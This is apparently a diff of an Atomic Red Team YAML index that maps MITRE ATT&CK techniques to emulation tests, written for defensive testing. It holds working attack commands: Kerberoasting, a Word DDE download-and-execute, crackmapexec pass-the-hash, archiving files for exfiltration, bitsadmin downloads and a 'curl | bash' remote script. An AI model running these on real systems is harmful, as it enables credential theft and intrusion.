+        This test uses the Powershell Empire Module: https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1
+
+        The following are further sources and credits for this attack:
+        [Kerberoasting Without Mimikatz source] (https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)
+        [Invoke-Kerberoast source] (https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          Import-Module .\Invoke-Kerberoast.ps1
+          Invoke-Kerberoast | fl
   T1142:
     technique:
       x_mitre_data_sources:
@@ -19520,6 +20117,20 @@ execution:
           The Field Code should now be displayed, change it to Contain the following:
 
           {DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"  }
+    - name: Execute PowerShell script via Word DDE
+      description: 'When the word document opens it will prompt the user to click
+        ok on a dialogue box, then attempt to run PowerShell with DDEAUTO to download
+        and execute a powershell script
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'start $PathToAtomicsFolder\T1173\bin\DDE_Document.docx
+
+'
   T1118:
     technique:
       x_mitre_data_sources:
@@ -22504,10 +23115,10 @@ lateral-movement:
       modified: '2019-07-18T16:56:39.990Z'
       identifier: T1075
     atomic_tests:
-    - name: Mimikatz Pass the Hash
-      description: |
-        Note: must dump hashes first
-        [Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)
+    - name: crackmapexec Pass the Hash
+      description: 'command execute with crackmapexec
+
+'
       supported_platforms:
       - windows
       input_arguments:
@@ -22520,14 +23131,22 @@ lateral-movement:
           type: string
           default: atomic.local
         ntlm:
-          description: ntlm hash
+          description: command
           type: string
           default: cc36cf7a8514893efccd3324464tkg1a
+        command:
+          description: command to execute
+          type: string
+          default: whoami
       executor:
         name: command_prompt
-        command: 'mimikatz # sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}
+        elevation_required: false
+        prereq_command: 'powershell -c if(Test-Path C:\CrackMapExecWin\crackmapexec.exe)
+          { 0 } else { -1 }
 
 '
+        command: "crackmapexec #{domain} -u #{user_name} -H #{ntlm} -x #{command}
+          \n"
   T1097:
     technique:
       x_mitre_data_sources:
@@ -23632,8 +24251,26 @@ collection:
       - macos
       executor:
         name: bash
-        command: curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/Discovery.sh
+        command: 'curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/Discovery.sh
           | bash -s > /tmp/discovery.log
+
+'
+    - name: Zip a Folder with PowerShell
+      description: 'use living off the land tools to encrypt and zip a file for exfiltration
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: 'Compress-Archive -Path $PathToAtomicsFolder\T1074\bin\Folder_to_encrypt
+          -DestinationPath $env:TEMP\Folder_to_encrypt.zip
+
+'
+        cleanup_command: 'Remove-Item -Path $env:TEMP\Folder_to_encrypt.zip
+
+'
   '':
     technique:
       x_mitre_permissions_required:
@@ -24336,11 +24973,11 @@ exfiltration:
         elevation_required: false
         command: |
           echo "This file will be encrypted" > /tmp/victim-gpg.txt
-          mkdir /tmp/victim-files
+          mkdir PathToAtomicsFolder/T1022/victim-files
           cd /tmp/victim-files
           touch a b c d e f g
-          zip --password "insert password here" /tmp/victim-files.zip /tmp/victim-files/*
-          gpg -c /tmp/victim-gpg.txt
+          zip --password "insert password here" $PathToAtomicsFolder/victim-files.zip /tmp/victim-files/*
+          gpg -c $PathToAtomicsFolder/T1022/victim-gpg.txt
           <enter passphrase and confirm>
           ls -l
     - name: Compress Data and lock with password for Exfiltration with winrar
@@ -24384,8 +25021,8 @@ exfiltration:
         name: command_prompt
         elevation_required: false
         command: |
-          mkdir .\tmp\victim-files
-          cd .\tmp\victim-files
+          mkdir $PathToAtomicsFolder\T1022\victim-files
+          cd $PathToAtomicsFolder\T1022\victim-files
           echo "This file will be encrypted" > .\encrypted_file.txt
           7z a archive.7z -pblue
           dir
@@ -24622,65 +25259,58 @@ exfiltration:
 command-and-control:
   '':
     technique:
-      x_mitre_permissions_required:
-      - User
       x_mitre_data_sources:
       - Host network interface
       - Netflow/Enclave netflow
+      - Network intrusion detection system
       - Network protocol analysis
       - Packet capture
-      - SSL/TLS inspection
-      name: Web Service
+      - Process use of network
+      name: Standard Non-Application Layer Protocol
       description: |-
-        Adversaries may use an existing, legitimate external Web service as a means for relaying commands to a compromised system.
+        Use of a standard non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. (Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).
 
-        These commands may also include pointers to command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.
-
-        Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.
-
-        Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).
-      modified: '2019-07-18T21:21:18.135Z'
-      id: attack-pattern--830c9528-df21-472c-8c14-a036bf17d665
-      x_mitre_network_requirements: true
+        ICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts; (Citation: Microsoft ICMP) however, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.
+      id: attack-pattern--c21d5a77-d422-4a69-acd7-2c53c1faa34b
+      x_mitre_contributors:
+      - Ryan Becwar
       x_mitre_platforms:
+      - Windows
       - Linux
       - macOS
-      - Windows
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       x_mitre_version: '1.0'
       type: attack-pattern
-      x_mitre_detection: 'Host data that can relate unknown or suspicious process
-        activity using a network connection is important to supplement any existing
-        indicators of compromise based on malware command and control signatures and
-        infrastructure or the presence of strong encryption. Packet capture analysis
-        will require SSL/TLS inspection if data is encrypted. Analyze network data
-        for uncommon data flows (e.g., a client sending significantly more data than
-        it receives from a server). User behavior monitoring may help to detect abnormal
-        patterns of activity. Analyze packet contents to detect communications that
-        do not follow the expected protocol behavior for the port that is being used.
-        (Citation: University of Birmingham C2)'
+      x_mitre_detection: |-
+        Analyze network traffic for ICMP messages or other protocols that contain abnormal data or are not normally seen within or exiting the network.
+
+        Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)
+
+        Monitor and investigate API calls to functions associated with enabling and/or utilizing alternative communication channels.
       created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
-      x_mitre_contributors:
-      - Anastasios Pingios
-      created: '2017-05-31T21:31:13.915Z'
+      x_mitre_network_requirements: true
+      created: '2017-05-31T21:31:10.728Z'
       kill_chain_phases:
       - kill_chain_name: mitre-attack
         phase_name: command-and-control
-      - kill_chain_name: mitre-attack
-        phase_name: defense-evasion
       external_references:
-      - external_id: T1102
+      - external_id: T1095
         source_name: mitre-attack
-        url: https://attack.mitre.org/techniques/T1102
+        url: https://attack.mitre.org/techniques/T1095
+      - source_name: Wikipedia OSI
+        description: Wikipedia. (n.d.). List of network protocols (OSI model). Retrieved
+          December 4, 2014.
+        url: http://en.wikipedia.org/wiki/List_of_network_protocols_%28OSI_model%29
+      - source_name: Microsoft ICMP
+        description: Microsoft. (n.d.). Internet Control Message Protocol (ICMP) Basics.
+          Retrieved December 1, 2014.
+        url: http://support.microsoft.com/KB/170292
       - source_name: University of Birmingham C2
         description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
           & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
         url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
-      x_mitre_defense_bypassed:
-      - Binary Analysis
-      - Log analysis
-      - Firewall
+      modified: '2019-07-18T21:18:02.753Z'
     atomic_tests: []
   T1090:
     technique:
@@ -25423,6 +26053,102 @@ command-and-control:
         name: sh
         elevation_required: false
         command: 'telnet #{domain} #{port}
+
+'
+  T1102:
+    technique:
+      x_mitre_permissions_required:
+      - User
+      x_mitre_data_sources:
+      - Host network interface
+      - Netflow/Enclave netflow
+      - Network protocol analysis
+      - Packet capture
+      - SSL/TLS inspection
+      name: Web Service
+      description: |-
+        Adversaries may use an existing, legitimate external Web service as a means for relaying commands to a compromised system.
+
+        These commands may also include pointers to command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.
+
+        Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.
+
+        Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).
+      modified: '2019-07-18T21:21:18.135Z'
+      id: attack-pattern--830c9528-df21-472c-8c14-a036bf17d665
+      x_mitre_network_requirements: true
+      x_mitre_platforms:
+      - Linux
+      - macOS
+      - Windows
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      type: attack-pattern
+      x_mitre_detection: 'Host data that can relate unknown or suspicious process
+        activity using a network connection is important to supplement any existing
+        indicators of compromise based on malware command and control signatures and
+        infrastructure or the presence of strong encryption. Packet capture analysis
+        will require SSL/TLS inspection if data is encrypted. Analyze network data
+        for uncommon data flows (e.g., a client sending significantly more data than
+        it receives from a server). User behavior monitoring may help to detect abnormal
+        patterns of activity. Analyze packet contents to detect communications that
+        do not follow the expected protocol behavior for the port that is being used.
+        (Citation: University of Birmingham C2)'
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_contributors:
+      - Anastasios Pingios
+      created: '2017-05-31T21:31:13.915Z'
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: command-and-control
+      - kill_chain_name: mitre-attack
+        phase_name: defense-evasion
+      external_references:
+      - external_id: T1102
+        source_name: mitre-attack
+        url: https://attack.mitre.org/techniques/T1102
+      - source_name: University of Birmingham C2
+        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
+          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
+        url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
+      x_mitre_defense_bypassed:
+      - Binary Analysis
+      - Log analysis
+      - Firewall
+      identifier: T1102
+    atomic_tests:
+    - name: Reach out to C2 Pointer URLs via command_prompt
+      description: 'Download data from a public website using command line
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'bitsadmin.exe /transfer "DonwloadFile" http://www.stealmylogin.com/
+          %TEMP%\bitsadmindownload.html
+
+'
+        cleanup_command: 'del %TEMP%\bitsadmindownload.html
+
+'
+    - name: Reach out to C2 Pointer URLs via powershell
+      description: 'Multiple download methods for files using powershell
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          Invoke-WebRequest -Uri www.twitter.com
+          $T1102 = (New-Object System.Net.WebClient).DownloadData("https://www.reddit.com/")
+          $wc = New-Object System.Net.WebClient
+          $T1102 = $wc.DownloadString("https://www.aol.com/")
+        cleanup_command: 'Clear-Variable T1102
 
 '
 initial-access:
